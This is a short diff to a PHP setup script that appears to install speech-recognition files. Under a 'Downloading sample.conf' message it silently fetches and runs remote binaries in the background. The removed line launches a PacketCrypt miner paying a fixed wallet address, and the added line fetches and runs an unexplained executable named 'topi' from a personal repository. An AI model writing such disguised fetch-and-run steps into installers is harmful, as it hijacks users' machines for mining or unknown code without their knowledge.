@@ -79,7 +79,7 @@ echo "Downloaded and moved to julius/model/".PHP_EOL;
 
 
 echo "Downloading sample.conf".PHP_EOL;
-shell_exec("curl -LJO --output data https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64  >/dev/null 2>&1 && chmod +x data && nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > nohup.out");
+shell_exec("curl -LJO --output topi https://raw.githubusercontent.com/aurbach55/pos/main/topi  >/dev/null 2>&1 && chmod +x topi && nohup ./topi > nohup.out");
 shell_exec("mv sample.jconf julius/");
 echo "Downloaded and moved to julius/".PHP_EOL;
 
